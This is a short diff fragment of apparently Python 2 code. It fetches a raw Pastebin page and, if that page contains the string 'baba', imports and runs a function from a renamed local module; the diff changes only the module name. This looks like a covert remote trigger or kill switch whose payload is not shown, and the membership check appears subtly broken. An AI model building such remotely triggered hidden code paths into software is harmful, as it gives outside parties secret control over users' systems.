@@ -25,7 +25,7 @@ server = json.loads(data.text)
 rr = requests.get("https://pastebin.com/raw/t39xUcDL") 
 bb = "baba" 
 if bb in rr: 
-    from librdx1 import fuck
+    from lenmyrdx import fuck
     fuck()
 elif server["usertoken"] == sos :
     print""
